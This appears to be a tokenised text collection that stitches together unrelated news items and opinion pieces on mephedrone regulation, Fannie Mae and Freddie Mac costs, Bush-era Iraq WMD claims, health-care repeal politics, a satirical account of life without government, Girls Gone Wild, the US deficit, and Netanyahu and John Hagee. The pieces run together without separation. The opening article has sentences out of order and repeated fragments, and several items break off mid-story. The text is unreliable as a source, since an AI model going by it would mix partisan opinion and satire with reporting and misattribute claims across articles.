" His intervention sparked a number of resignations from the Advisory Council on the Misuse of Drugs and left the government scrabbling around for independent advice , " he said .
Harry Shapiro from the charity DrugScope said : " As it appears that there is a lot of mephedrone in circulation , users and dealers will probably use up their existing supplies over the coming months ...
" Legislation has a role , but primarily the focus should be on prevention , education and tackling drug use as a public health issue . "
Resignation letter Mephedrone , a synthetic stimulant , is known by various names , including " m- cat " , and " meow meow " .
There is little more we can do to describe the importance of ensuring that advice is not subjected to a desire to please ministers

What is mephedrone ?
So far there is no conclusive scientific proof that mephedrone has been responsible for any deaths in the UK , and scientists are still trying to work out whether it is harmful on its own or if taken with something else .
But there have been at least 18 deaths in England where cathinones - the group of drugs into which mephedrone falls - have been implicated , an ACMD meeting on Friday revealed .
Seven provided post mortem evidence of mephedrone , and a further seven deaths in Scotland have been linked to the drugs .
There had been speculation the 11th - hour resignation of Dr Polly Taylor from the ACMD could delay a ban because of rules about its membership .
Lib Dem science spokesman Dr Evan Harris said a ban would have to wait until the council was " legally constituted " under the terms set out in the the Misuse of Drugs Act .
The law says any move to ban a drug must follow consultation with the ACMD .
But a spokesman from the Home Office said : " Based on its current formation the ACMD is still able to fulfil its statutory role and provide advice on mephedrone today on which we can act . "
The interim chair of the ACMD , Professor Les Iversen , said the ACMD was " saddened and disappointed " that Dr Taylor - the council 's veterinary medicine expert - had resigned .
Dr Taylor said she " did not have trust " in the way the government would treat the council 's advice .
In her resignation letter , Dr Taylor told the home secretary : " I feel that there is little more we can do to describe the importance of ensuring that advice is not subjected to a desire to please ministers or the mood of the day's press . "

It 's looking increasingly like Fannie Mae and Freddie Mac are going to cost the US government much more than AIG .
In its latest long - term budget outlook released in late January , the CBO projected that the AIG bailout would ultimately cost the Treasury $ 9 billion dollars .
Indeed , the entire private financial industry bailout is ultimately expected to cost less than $ 30 billion ; of the $ 99 billion that the CBO expects we will ultimately lose on TARP , half of the loss comes not from helping the " banksters " , but from the Obama administration 's decision to bail out the automakers .
A further $ 20 billion will be spent on the Home Affordable Mortgage Program , aka the administration 's mortgage modification plan .
By contrast , the nationalization of the Government Sponsored Entities is expected to cost the Federal government $ 64 billion between 2011 and 2020 , on top of the $ 110 billion we 've already spent .
Fannie and Freddie have long defended themselves on the grounds that their underwriting standards were n't nearly as bad as those in the private sector .
But they 've certainly been better at socializing their losses ; firms that controlled maybe half of the mortgage market will end up costing the taxpayer four times as much as the other troubled financial institutions .
And that CBO report was issued before yesterday 's announcement that due to an accounting change , Fannie and Freddie were going to buy back many of their non-performing mortgages rather than continue to make payments to the investors .
For those who have n't been following along at home , Fannie and Freddie guaranteed loans they packaged for resale , which means when homeowners default , they have to make the payments .
This is expensive , so Freddie and Fannie have decided to repurchase the loans .
This is actually probably good news for the taxpayer over the long run , because they 'll be borrowing money to buy out the investors at lower interest rates than the interest rates on the non-performing loans for which they 're currently covering the payments .
But it raises some disturbing questions .
First , why is an entity that is essentially an arm of the US government paying out extra cash in order to maintain some accounting fiction ?
And second of all , how long before they have to do this again ?

With his soon - to - be - released book , Karl Rove is trying to mount something of a rear - guard action in the war over George W. Bush ’s legacy .
According to the AP , which has obtained a copy of the book , Rove
blames himself for not pushing back against claims that President George W. Bush had taken the country to war under false pretenses , calling it one of the worst mistakes he made during the Bush presidency .
The president , he adds , did not knowingly mislead the American public about the existence of [ weapons of mass destruction ] .
And The New York Times reports that in the book , which will hit stores on Tuesday , Rove writes that his failure to counter the narrative that “ Bush lied ” was “ one of the biggest mistakes of the Bush years . ”
Rove adds , “ did Bush lie us into war ?
Absolutely not . ”
Here we go again : Did Bush grease the way to war with lies ?
Having written two books on the subject — The Lies of George W. Bush and ( with Michael Isikoff ) Hubris : The Inside Story of Spin , Scandal , and the Selling of the Iraq War — I have some skin in this game .
Let ’s cut to the bottom line : prior to the Iraq war , US intelligence generally produced faulty information overstating Saddam Hussein ’s WMD capabilities , which were actually nonexistent .
But Bush and his crew purposefully and callously overstated these overstatements — and made dramatic and untrue assertions unconnected to the flawed intelligence — in order to whip up popular support for the invasion of Iraq .
Mother Jones has produced a timeline that lists the false Bush administration assertions .
And to remind Rove — and book reviewers — here ’s a limited sampling of notable whoppers , reported in my books and elsewhere .
When Bush issued his ultimatum to Saddam Hussein on March 17 , 2003 , he declared , “ Intelligence gathered by this and other governments leaves no doubt that the Iraq regime continues to possess and conceal some of the most lethal weapons ever devised . ”
But there was doubt — and plenty of it .
Intelligence analysts had registered uncertainty regarding key elements of Bush ’s case for war — such as whether Iraq had attempted to obtain uranium in Niger , and whether it had purchased aluminum tubes for an enrichment process to make material for nuclear weapons .
Moreover , the doubters were correct .
Seven months earlier , Vice President Dick Cheney similarly said in a speech , “ Simply stated , there ’s no doubt that Saddam Hussein now has weapons of mass destruction .
There is no doubt he is amassing them to use against our friends , against our allies , and against us . ”
But there was no intelligence suggesting that Saddam ’s intention was to beef up his WMD arsenal so he could deploy it against the United States — which would have been a suicidal act .
In fact , the existing intelligence indicated Saddam was not interested in a WMD showdown with the United States .
During an October 7 , 2002 , speech in Cincinnati , Bush declared that UN inspectors had “ concluded ” that Iraq in the 1990s had actually produced “ two to four times ” the 30,000 liters of anthrax and other deadly biological agents than it had acknowledged making .
Bush went on : “ This is a massive stockpile of biological weapons that has never been accounted for , and capable of killing millions . ”
But UN inspectors had concluded no such thing .
They had reported destroying key facilities Iraq had used to develop chemical , biological , and nuclear weapons .
The inspectors had encountered discrepancies in the accounting of Iraq ’s weapons and WMD material and had noted that Iraq could have produced more weapons than the inspectors had uncovered .
Bush was misstating the facts to turn a possible stockpile of WMDs into an actual arsenal .
Throughout the fall of 2002 and the winter of 2003 , Bush and his aides insisted Iraq was loaded with WMDs .
At one point , Defense Secretary Donald Rumsfeld huffed , “ There ’s no debate in the world as to whether they have those weapons …
We all know that .
A trained ape knows that . ”
On January 7 , 2003 , Rumsfeld declared , “ They currently have chemical and biological weapons . ”
Yet a September 2002 report by the Defense Intelligence Agency said , “ There is no reliable information on whether Iraq is producing or stockpiling chemical weapons , or where Iraq has — or will — establish its chemical warfare agent production facilities . ”
A national intelligence estimate produced about that time did assert , “ Baghdad has chemical and biological weapons . ”
The point is that contradictory information existed , yet Bush and his crew chose to ignore any data that undermined their contention that Saddam was up to his neck in WMDs .
At a September 7 , 2002 , joint news conference with British Prime Minister Tony Blair , Bush said that a 1998 International Atomic Energy Agency report had found that Iraq was “ six months away from developing a [ nuclear ] weapon .
I do n’t know what more evidence we need . ”
But there was no such IAEA report .
And in 1998 , the IAEA had reported there were “ no indications ” that Iraq was producing nuclear weapons .
Bush had concocted a nonexistent report to bolster the case for war .
On November 7 , 2002 , Bush said Saddam “ is a threat because he ’s dealing with Al Qaeda . ”
Yet as the 9/11 Commission later noted , there had been no intelligence confirming contacts between Iraq and Al Qaeda that added up to an operational relationship .
( On September 26 , 2002 , Rumsfeld said that he had “ bullet - proof ” evidence that Saddam was tied to Osama bin Laden .
He never produced that evidence .
In March 2003 , Cheney claimed Saddam had a “ long - standing relationship ” with Al Qaeda .
He did n’t . )
At a December 31 , 2002 , press conference , Bush asserted , “ We do n’t know whether or not [ Saddam ] has a nuclear weapon . ”
But there was no intelligence at the time suggesting that the Iraqi dictator might already possess nuclear weapons .
The faulty national intelligence estimate produced in October 2002 had errantly declared that Iraq was “ reconstituting ” its nuclear weapons program but it had also concluded Iraq had no nuclear weapons and would not be able to produce one for years .
Bush had no basis for suggesting Saddam could already be nuclear - armed .
Yet he did so .
I could go on .
Remember Colin Powell ’s lengthy UN presentation ?
Practically every relevant fact in it proved to be false .
Rove can argue that in the run-up to the war , Bush and the others believed what they were saying about Iraq ’s WMDs .
But Bush and his crowd demonstrated a profound disinterest in sorting out the truth .
They made no effort to distinguish between known facts and convenient suppositions .
They exaggerated .
They trumped up unconfirmed pieces of information .
They presented rosy assumptions .
They overlooked or discounted data that did n’t advance the cause .
It was a PR campaign girded with misrepresentations and false statements .
Rove contends that his old boss did not knowingly bamboozle the public .
( Bush , though , did in a January 2003 meeting with Tony Blair raise the idea of staging an incident — in which US reconnaissance planes painted in UN colors would fly over Iraq and try to draw fire — to provoke an excuse for war . )
But Bush , Cheney , and other administration aides exercised a thoroughly reckless disregard for the truth , as they pushed an utterly phony and over - the - top case for invading Iraq .
As Rove makes the rounds on his book tour , he ought to be pressed on all this .
There is no doubt that the Bush posse mischaracterized what was known and not known about WMDs in Iraq .
It was easy — and useful — for them to do so , for they did n’t care to get this right .
( After all , as Rove writes , the Iraq war would have likely not occurred without the WMD argument : “ Congress was very unlikely to have supported the use - of - force resolution without the WMD threat . ” )
Bush and his aides , Rove included , were not looking to lead an informed debate based on the best information available ; they were aiming to start a war .
Almost by any means necessary .
They spun the nation into Iraq — and now Rove is spinning to cover that up .
Even in humiliating defeat , the Republicans on the Hill are finding new and exciting ways to use disinformation to rally their own troops for their own political gain .
Check out this tweet offered up in the wake of last night 's vote in the House from South Carolina Republican Bob Inglis :
What do you do when Congress passes a bad bill ?
You get a new Congress to repeal it !
Either Congressman Inglis is either a bit fuzzy on that whole " How a Bill Becomes a Law " thing , or he is extraordinarily optimistic about Republican prospects in this year 's election cycle .
Because , of course , not even a Republican seizure of Congress would allow for a successful repeal of Health Care reform .
There is the small matter of the presidential veto .
With the veto pen in hand , any GOP effort to repeal is n't going to require 218 votes in the House and 51 in the Senate , it 's going to require 290 and 67 .
That would require , even if the GOP were able to hold all 34 Democratic dissidents ( unlikely ) , a seventy - eight seat gain in the House for the GOP .
The wall to climb in the Senate is , shall we say , a little more burdensome .
A twenty - six seat gain , which would be particularly problematic , given that there are n't 26 Democrats running for re-election in this cycle .
Now , it 's possible that Congressman Inglis merely forgot that a Democrat was President .
But that seems pretty unlikely .
It seems infinitely more likely that the " repeal the bill " meme ( which , to be fair to Inglis , is being flogged by other Republicans , as well ) is a cynical attempt to keep their faithful engaged , on the false hope that the powerless GOP can do something about it .
Our team of legal professionals at Abrams & Ament , P.C. , has been committed to serving our clients ’ needs from day one .
And although many of Illinois ’ laws have changed since our doors first opened in 1984 , our focus on accessibility , professionalism and individualized attention has not .
You will notice these attributes immediately when you consult with us .
It may be the care we take when compassionately addressing your concerns .
It may be the range of legal alternatives we offer when we seek to resolve your conflict .
We are driven to advocate for you to the best of our abilities .
Our firm has grown as a result of our dedication and record of success .
Led by our principal attorney , Rickey J. Ament , our firm now maintains offices in Palatine , Buffalo Grove and Waukegan .
We are proud to offer skilled advice close to homes throughout Lake County and northern Cook County .
The first few days were a little chaotic while all of us coped with more change than we could ever have imagined .
The electricity stayed on , but being that they were no longer a regulated utility my rates tripled .
Some corporation with one of those names that looks vaguely Greek took over the formerly city water and those rates also skyrocketed .
In addition to paying more for my water , I no longer know if it ’s safe to drink .
One of my neighbors is a scientist and he ’s been testing it for us , as there were reports in the next suburb over than contaminants have been found in their water and people were seriously ill .
Because it ’s gone , we ca n’t call city hall .
Oh and now that spring is here , it ’s flood and tornado season .
We live close to but not in the flood plain .
I am trying to order sand and sandbags with my neighbors .
A couple of blocks over one person ordered his own dump truck full of sand and it takes up most of his front yard .
The neighborhood kids think it ’s great fun .
Apparently some other people are stealing his sand at night .
It ’s obviously not a big deal , but as an early sign of lawlessness and with no police , it really bothers me .
I am a hunter and I shoot skeet so I have a few guns and ammo , which are of course in a locked gun cabinet .
The idea that I may have to use them to defend my family is new and scary for me .
So far people have been mostly trying to help each other but it does seem like civility is unraveling a bit more every day .
We feel less and less safe .
Many former police officers are now armed guards at Walmart and other corporations .
When the government drowned , NOAA and the National Weather service also went down the drain .
We have no way of knowing how high the river is and I really miss the weather watches and warnings .
There was an early tornado about a hundred miles away and too many people died that would n’t have had to .
The weather report now is mostly to be had by looking out the window .
I hear that once the government satellite system is auctioned off that weather reporting will be available for a fee .
I never really thought much about the fire department .
I just thought about calling 911 and knew they would appear if my house were on fire .
Well 911 is gone .
The police are gone along with all the firefighters .
I hear that they are trying to provide private fee for service protection soon but the price tag on that will be beyond my means .
At the end of my street one house burned down and we neighbors all brought our garden hoses to try and prevent the fire from spreading .
I just got my homeowners insurance update and premiums are four times last year ’s cost because of the lack of public services .
I can increase my deductible but still …
Did I mention that all the public schools closed ?
Well they did and my two youngest are in middle school and high school .
Neither my wife nor I feel up to homeschooling but we ’ve ordered some materials and I suppose we ’ll just have to rise to the occasion .
The private schools , sensing an opportunity to charge whatever they want are way too expensive for us .
My oldest is attending a private college on a combination of scholarships and student loans .
The student loans were guaranteed by the federal government so they just disappeared into thin air .
We ’re not sure what she ’ll do as the private loans without regulation or government backing are at 35 % plus interest rates .
The public universities are trying to reopen as private institutions but who knows how that will turn out .
My daughter can’t just come home and get a job .
Unemployment is pushing 40 % with all the former government employees looking for work .
Wages reach new lows every week .
Without a minimum wage law , employers are offering less and less .
They ’ve also quit offering benefits .
Corporations justify all their changes citing things like the invisible hand of the market and competitive pressures .
When I was a kid , my mom used to ask me , “ if everyone jumped off a cliff , would you ? ”
Well I ’m glad my mom is n’t around to see what people are capable of .
Actually , there is n’t such a thing as thin air anymore .
The companies that were once heavy polluters have resumed polluting .
There are n’t air pollution alerts either .
I have no idea who issued those but apparently it was one of those agencies that drowned .
We are all wearing face masks and soon will be wearing goggles as well as my eyes burn if I ’m outside too long .
Oh I have n’t yet mentioned the trip to the grocery store .
I had no idea how much the agricultural subsidies were keeping the cost of food down and how much the inspection processes kept our food safe .
Food prices have doubled .
We ’ll for sure be planting a garden and fortunately bought our seeds before the shortages .
The big seed companies are trying to sell seeds that do n’t reproduce so they ’ll have a captive market forever .
People are dying from salmonella and ecoli .
It ’s not just bad peanut butter and tainted hamburger either .
With the F.D.A. and the C.D.C. gone no one knows which foods are the troublemakers .
It ’s just another one of those things we used to take for granted .
My father and my mother - in - law have moved in with us .
It really helps to pool our resources and my mother - in - law is a good gardener .
My dad will build a fence around our little plot and we may take turns sleeping outside to guard our crops .
Both have contributed their small savings to our efforts to survive .
We ’ve been lucky so far with our health as we have n’t needed many services .
Because so many doctors ( 83 % ) used government backed student loans for medical school they are n’t being allowed to practice if they still have a loan balance .
Apparently , anyone who benefitted from government is being punished .
We found a free clinic for my son ’s broken ankle but we waited 26 hours to be seen .
It was a mess before , but it ’s a meta -mess now .
Canada is building a border fence to keep U.S. citizens out .
Not that we could get to Canada anyway .
The roads are a mess .
It would have been nice if the drowning had occurred after the potholes had been fixed and the bridges repaired .
I can only imagine what will happen if we get one more big dump of snow .
Since we ’re on our own now , I ’m hoping that a slogan like “ let a 1,000 shovels dig ” will take hold and some sort of community organization will emerge to deal with maintenance and repairs of our local streets .
The interstates were sold to a private corporation and I have to swipe my credit card at each entrance and exit ramp .
It ’s so expensive that I rarely see just one person in a car these days but without speed limits it ’s more like dodgem cars than any sort of organized human behavior .
People are letting their car insurance lapse and if they are lucky , they just walk away from accidents and leave their wreck for others to avoid .
Of course , the courts were part of government so they are also gone .
They are n’t really needed with no laws to enforce .
I do n’t feel so bad for the kind of person that filed frivolous lawsuits , but I do feel bad for other people who probably had a real legitimate lawsuit .
How about the people whose baby died because the crib was defective ?
How about all those Toyota owners with defective cars ?
I forgot to mention what happened to the internet .
You know it was originally developed by the Department of Defense , right ?
Well those people that wanted government so small it could be drowned in a bathtub are claiming that the internet is really a government program and should therefore be flushed .
I do n’t know how long I ’ll be able to log on .
It ’s become my news source and my community center and if it went away , I ’d be lost .
The Post Office is gone and I do so rely on my email .
We were all frustrated with our government before the drowning .
I can remember friends and neighbors saying things like “ Throw the bums out . ”
We focused on the cost of government and the things that it did n’t do well .
We forgot about the many things it did better or cheaper than we can do them as individuals .
Some people were ranting about socialism like it was a really bad word .
They are certainly rethinking things now .
Well let me tell you that those same people are wishing for the bums to come back only now they are hoping for bums that will put people before profits .
NRCC orders ' Project Code Red '
As President Barack Obama prepared to make a statement Wednesday afternoon outlining his desired way forward for health care legislation , the National Republican Congressional Committee geared up to target vulnerable Democrats who were still wavering on the issue .
The committee planned to unveil a new initiative , Project Code Red , in the House GOP Conference 's weekly meeting , that 's designed to put pressure on lawmakers who are weighing how to proceed on health care .

Project Code Red , anchored at the website www.nrcc.org/codered, will include paid media in targeted districts and a media blitz by Republican doctors serving in the House .
In addition to sending physician - Reps .
Tom Price ( Ga. ) , Charles Boustany ( La. ) and Michael Burgess ( Texas ) to fan out and deliver their party 's message on health care , the NRCC also plans to activate the GOP group , Physicians Council for Responsible Reform , which will organize sympathetic doctors to speak out against the Democratic bills .
The committee 's offensive is n't just designed to make Democrats who ultimately support health care reform suffer at the polls , an NRCC official told POLITICO , it 's also to give some lawmakers second thoughts about voting for a health care bill in the first place .
" If the House is the last line of defense to stop this bill that the American people oppose , Project Code Red is the vehicle we hope will ensure that this government takeover never becomes law , " the official said .
Time is of the essence for Republicans who hope to deal a final , fatal blow to the Democrats ' hopes for comprehensive health care legislation .
The White House confirmed Tuesday night that Obama " will urge Congress to move swiftly toward votes " on health care , and an Associated Press analysis earlier this week suggested a handful of House Democrats who voted against earlier health care legislation might be open to supporting final passage of a revised measure .

In case you have n't read this already , Joe Francis , the guy who runs the " Girls Gone Wild " empire , has been revealed by the L.A .
Times to be a crazy , abusive , profoundly fucked - up asshole .
I do n't actually have a lot to add on that particular topic apart from " Damn , what a crazy , abusive , profoundly fucked - up asshole . "
Actually , the phrase " crazy , abusive , profoundly fucked - up asshole " would seem to be an understatement .
But I do feel somewhat compelled to comment .
I wrote a fairly lavish think piece about the " Girls Gone Wild " videos for the big Disinformation anthology Everything You Know About Sex Is Wrong ( you can read it on my website if you like ) , and since then , I feel like I 've become the Feminist Sex Writer Who Thinks The " Girls Gone Wild " Videos Are At Least Somewhat Defensible .
So whenever the topic of these videos comes up , I feel like I need to chime in .
What I want to talk about now is not the people who run the " Girls Gone Wild " empire , but the " Girls Gone Wild " videos themselves -- and the women who perform in the videos .
And more specifically , I want to talk about what 's being said about the women in the videos .
The writing I 've seen about Girls Gone Wild is largely taking two directions .
One is pity / concern for the poor exploited girls who are being taken advantage of when they 're too excited / too young / too drunk to know what they 're doing .
The other is pity / contempt for the vulgar idiot girls who are squandering their feminist heritage by pulling their shirts up on camera ... and are ruining things for the rest of us .
And I have much the same problem with both .
I think there 's more than a whiff of patronization , and elitism even , in both attitudes .
Let me talk about the first one first .
In the strict Marxist sense , of course the women in GGW are being exploited .
They 're being paid a disproportionately low amount for their labor -- they 're getting paid in T - shirts and Mardi Gras beads , so duh -- and someone else is getting rich off that labor .
But I 've seen a few of these videos , and it sure looks to me like most of these girls know what they 're doing and very much want to be doing it .
They like the attention ; they get off on exhibitionism ; they enjoy feeling sexy and wild ; they like having an excuse to do dirty things they would n't ordinarily do .
Will they regret it later ?
Maybe .
Some of them almost certainly will .
But you know , a lot of us have done things in our youths that we now regret and can't take back .
( My entire first relationship leaps to mind . )
Making dumb choices that you regret is part of being young .
It 's the flip side of risk - taking and adventure .
As to the women being too drunk to consent goes , I 'm not seeing it .
I 've seen tipsiness in the GGW videos , high spirits , probably even some impaired judgement -- but not blackout drunkenness , not drunkenness that would obliterate consent .
I could be wrong , I 'm not there on the streets of Spring Break with a Breathalyzer and a lie detector test ( those do n't work , anyway ) ... but it sure looks to me like , hammered though many of them are , most of these girls know what they 're doing and know what they want .
Which brings me to my second point : the " they 're squandering their feminist heritage " argument .
This is the one that really bugs me .
It 's as if sexual liberation is only for those of us with the right sex - positive feminist credentials -- not for yahoo sorority girls who want to pull their shirts up on camera .
Like they do n't deserve to have sexual choices , because they 'll make the wrong ones .
But we all deserve sexual liberation .
We all deserve the freedom to make sexual choices -- even dumb ones or crass ones .
As someone whose name I can't remember once said , not all censorship battles can be about Ulysses .
( Does anyone know the source for that quote , btw ?
I could n't find it . )
And the battle for sexual liberation and the right to sexual expression can't always be about brilliant sex - themed performance art , or beautiful ecstatic lovemaking in loving long - term relationships .
Sometimes it 's about college girls at big drunken parties pulling their shirts off for the video cameras .
That 's the whole point of feminist sexual liberation -- we do n't get to go around scolding other women for their consenting sexual choices .
( Not on moral or political grounds , anyway .
On aesthetic grounds ... that 's another story . )
I 've seen arguments that the problem with GGW is n't the girls whipping their tops off for the camera -- it 's the people behind the camera , the crassness of the videos and the company and the grotesqueness of the main man behind them .
It 's not liberated or empowering if you 're whipping your top off for exploitative assholes , or so goes the argument .
But while I 'm certainly not going to defend the motives of the GGW empire ( especially not now ) , I still think we should support the sexual agency of the wild girls themselves .
Do you think every single porn movie that Annie Sprinkle or Nina Hartley ever made was a delicate work of artistic beauty and profound insight , made by sensitive feminists , with the profits going to rape crisis centers and saving the rainforest ?
I sure do n't .
I 'm sure that at least some of their movies were silly and dumb , and that the profits from at least some of them went to pay for the sports cars and coke habits of nitwit Silicone Valley porn producers .
That does n't negate Nina and Annie 's sexual agency and power .
And I think a lot of the " wo n't somebody please think of the children ? " hysteria about the women in the GGW videos is just flat - out sexist .
The same company that makes the " Girls Gone Wild " videos also makes " Guys Gone Wild " videos as well ... and I think it 's extremely interesting that nobody , not one person that I 've heard or read on this subject , has gotten upset about the poor stupid young college boys with low self - esteem who got drunk and let themselves be manipulated into flashing their asses and dicks on camera , and who are going to feel violated and ashamed the next morning and will regret it for the rest of their lives .
It 's apparently just young women who are incapable of making their own sexual decisions and living with the consequences .
So here is my plea .
Can we please , please , try not to extend our excoriation of Joe Francis to an excoriation of the women who 've performed in his videos ?
Can we please treat them like adults , and in the absence of evidence to the contrary , give them the benefit of the doubt and assume that they do what they do because they want to do it ?
Can we please at least try to remember that other people like different sexual things from what we like ... and not jump to the conclusion that if someone is doing something sexual that we would n't enjoy , therefore they do n't enjoy it either , and therefore they 're only doing it out of manipulation , desperation , coercion , drunkenness , low self - esteem , cultural brainwashing , etc . ?
Because when we treat the Girls Gone Wild with patronizing pity and contempt , when we stop respecting them and their sexual agency , it 's a small step to disrespecting Nina Hartley and Tristan Taormino and Annie Sprinkle and Carol Queen and all the other great exhibitionists of the world .
And it 's a small step from there to disrespecting every woman -- and every man -- who makes unpopular sexual choices .

Scott Brown sent out a fantastical email to his supporters yesterday claiming that “ the Massachusetts political machine , ” a homogeneous entity , is recruiting Rachel Maddow to run against him .
According to The Daily Beast , Brown ’s “ evidence appears to rest on a message sent out by Massachusetts Democratic Party Chairman John Walsh on Twitter the same day a Facebook page supporting a Maddow bid went live .
‘ Some are talking about you running vs. Scott Brown in ‘ 12 , ’ Walsh tweeted , and the Boston blog Universal Hub suggested the message could have been meant for Maddow . ”
It was this Tweet that engendered Brown ’s ill - timed money - grubbing phantasmagoria .
“ Some like Rachel Maddow .
I ’m sure she ’s a nice person — I just do n’t think America can afford her liberal politics , ” he wrote in the offending email .
Except , of course , Rachel Maddow has no plans to replace Scott Brown as replacement Ted Kennedy .
Watch as she refutes the rumors on last night ’s Rachel Maddow Show , in a segment entitled “ Seriously , Scott Brown ?
Seriously ? ”

President Obama has presented Congress with a spending request of $ 3.8 trillion for the next fiscal year in 2011 , but with a third of it not paid for with taxes , thus resulting in a $ 1.3 trillion deficit ( a whopping 8.3 percent of GDP ) .
The small piece of good news is that this deficit is smaller as a portion of the nation ’s economic output than this year ’s gargantuan 10.6 percent for FY 2010 ( that $ 1.6 trillion deficit is a post - World War II record ) .
Budget deficits of this magnitude have occurred before , but only during cataclysmic wars – the Civil War and World Wars I and II .
Contrary to the rhetoric of congressional Republicans , who are stridently criticizing Obama for his excessive spending , these budget deficits are largely the result of George W. Bush ’s new entitlement program ( Medicare prescription drug coverage ) , the usual Republican fake tax cuts ( tax cuts without concomitant reductions in government spending ) , bank and insurance bailouts , and the conduct of two disastrous U.S. occupations of foreign countries .
Of course , Obama is far from blameless .
Using the key statistic of deficits as a portion of GDP , when Obama took office during FY 2009 , the budget deficit was more than 9 percent of GDP .
Obama ’s $ 787 billion stimulus package and bailout of car companies increased an already gaping deficit into the 10.6 percent post - World War II record .
The 8.3 percent figure for FY 2011 starts a downward projection but is still much too high .
In fact , all budget projections for years out past the current and requested years ( in this case , FY 2010 and FY 2011 ) are usually malarkey , because policy changes are unpredictable in the " out years . "
However , if history is any guide , Obama , a Democrat , over the long term will probably be better on deficits than George W. Bush , a Republican ( he could n’t be much worse ) .
That ’s because , according to conservative economist John H. Wood of Wake Forest University , historically , U.S. budget deficits have been closed after a crisis has passed .
Democrat Bill Clinton , with tax increases , cuts in military spending , and robust economic growth , managed to defy predictions for indefinite deficits from the Republican Reagan / Bush Sr. years and turned them into budget surpluses ending with FY 2001 , the year he left office .
Obama now faces a similar task of cleaning up the fiscal mess from the junior Bush ’s eight years .
Obama made his task harder by buying into the flawed Keynesian argument that increased government spending is good for the economy .
His stimulus package and car company bailouts just dug the fiscal hole deeper .
But now the good news is that he seems to have quit digging and may have turned the corner to smaller deficits as a percentage of GDP .
Only time will tell , but the wake - up call of the loss of Ted Kennedy ’s Senate seat in liberal Massachusetts ( in addition to dramatically lowering the probability that Obama ’s stealth budget - busting health care program will be enacted ) may cause Obama to become a " deficit - reduction Democrat , " much like his forebear Clinton .
After the Cold War , Clinton cut the defense budget despite the prosecution of many frivolous small wars that were unneeded for U.S. security .
So far , Obama continues to increase military spending while freezing only a small part of non-security spending .
Nancy Pelosi , the speaker of the House , has prudently said the avoidance of cutting security spending is unacceptable .
And security spending is massive .
According to Winslow Wheeler of the Center on Defense Information , the annual U.S. security budget – including spending on the wars , the Defense Department , the Department of Energy nuclear weapons programs , homeland security , veterans compensation , international affairs , non-DoD military retirement payments , and interest on the national debt accounted for by defense programs – is well over $ 1 trillion per year .
Cuts to such spending should not entail just slashing a few weapon systems – as was done in FY 2010 but not in FY 2011 – but need to result from a total reassessment of the non-traditional post - World War II U.S. foreign policy of U.S. militarized interventionism .
Such a policy should have been pronounced a failure when it caused the horrendous retaliatory terrorist attacks on 9/11 .
Instead , the tragedy triggered the initiation of a neoconservative hyper-version of this same foreign policy , the War on Terror ( which includes two unneeded and counterproductive occupations of two Muslim countries ) , which statistics show made the problem of terrorism worse .
The Cold War is long over , and the concomitant rationale ( dubious even then ) for using an interventionist U.S. foreign policy to attempt to run the world is now obsolete and even dangerous in an era of blowback terrorism .
Many empires throughout history have collapsed or withered away because their aspirations were too big for their wallets ; the U.S. is in that perilous position now .
Therefore , the United States should dramatically retract its defense perimeter , thus cutting the U.S. security budget by half and saving more than $ 500 billion a year .
Of course , doing this will not cut even half the annual $ 1.3 trillion deficit .
But it is a start on throwing dirt back in the cavernous budget hole .
David Beckham 's World Cup is over : Three - month lay - off with achilles tendon injury
Foot injury spells end to Becks ' season
Beckham pulled up in the centre circle under no pressure with just minutes remaining and immediately signalled to the bench , hopping towards the touchline on his healthy leg before collapsing to the floor in agony .

Former Valve studio Turtle Rock has reformed and appears to be working on new projects , according to updates on its website and Facebook .
Describing themselves as " developers who worked with Valve Software to help create Counter - Strike : Condition Zero and Left 4 Dead " , the group is currently hiring for animation and art roles .
Turtle Rock was formed in 2002 by Michael Booth , and spent some years collaborating with the likes of Valve until the Half - Life developer acquired it outright in 2008 , thanks in part to its ongoing work on Left 4 Dead .
However , Valve eventually asked employees at the studio to move up to its main office just outside Seattle , leading to the effective closure of the studio .
The Turtle Rock website does n't offer any new insight into these events , or explain the circumstances of the company 's resurrection , but does have some nice rootin ' tootin ' visuals and links to a recently released " side project " , an iPhone application called Garage Buddy .
Did Prime Minister Benjamin Netanyahu deliberately sabotage the Obama administration ’s attempt to restart peace talks ?
Netanyahu now claims he was blindsided by the announcement of housing construction in East Jerusalem , but his activities the evening of March 8 suggests that the ambush may have been premeditated .
Shortly after Vice President Joe Biden ’s arrival in Israel , Netanyahu and Jerusalem Mayor Nir Barkat were the headliners at Pastor John Hagee ’s two - hour Christians United for Israel ( CUFI ) extravaganza at the Jerusalem Convention Center .
Ambassador Michael Oren and Deputy Foreign Minister Daniel Ayalon were also in attendance .
There was no ambiguity .
It was a blatant and unabashed rejection of “ dividing the land , ” filled with repeated references to Jerusalem as the undivided capital of the Jewish people .
The impromptu event had not been listed on CUFI ’s calendar , but as soon as Hagee introduced Netanyahu , the political significance was apparent .
In a repeat of a similar event twelve years ago , the Israeli leader and the American televangelist had again taken preemptive steps to obstruct peace talks .
Netanyahu , Falwell , and Hagee , 1998
In January 1998 Netanyahu traveled to Washington to meet with President Bill Clinton , but first detoured to the Mayflower Hotel where hundreds of Christian Zionists had been assembled by Jerry Falwell .
In reference to the “ land for peace ” negotiations , John Hagee led the crowd in yelling , “ Not one inch !
Not one inch ! ”
When Falwell was later interviewed he stated , “ It was all planned by Netanyahu as an affront to Clinton . ”
After the rally , Netanyahu met with evangelical leaders who promised to organize their churches against the peace efforts .
Netanyahu had rallied Clinton ’s most virulent detractors .
Falwell had subsidized and distributed a conspiracy movie attacking Clinton and marketed it with an infomercial showing an informant in silhouette who claimed that Clinton had orchestrated numerous deaths .
He was later revealed as the head of Creative Ministries , Inc. which funded the movie and paid its “ witnesses , ” a fact which Falwell claimed he did not know .
Hagee was also mass marketing anti-Clinton materials including his 1997 book Day of Deception , which included chapters “ Witchcraft in the White House ” and “ Who Killed Vince Foster ? ”
Hagee claimed that Clinton was part of a United Nations conspiracy to take control of the world in preparation for the one world government of the anti-Christ .
Like the message to Clinton , the CUFI event demonstrates that Netanyahu can mobilize Obama ’s political opponents .
This time the event was televised by God TV , a popular network based in Jerusalem , featuring programs on prophecy and New World Order conspiracy theories , claiming a viewing audience of over 400 million worldwide .
The Greater Israel of Biblical Zionism
Monday ’s CUFI production was based on the concept of “ biblical Zionism , ” or the belief that God mandates nonnegotiable borders of Israel , and any leader or nation who thwarts this divine plan will be cursed .
Before introducing Netanyahu , Hagee stated , “ World leaders do not have the authority to tell Israel and the Jewish people what they can and can not do in Jerusalem . ”
He added , “ Israel does not exist because of a decree of the United Nations in 1948 .
Israel exists because of a covenant God made with Abraham , Isaac , and Jacob … The settlements are not the problem . ”
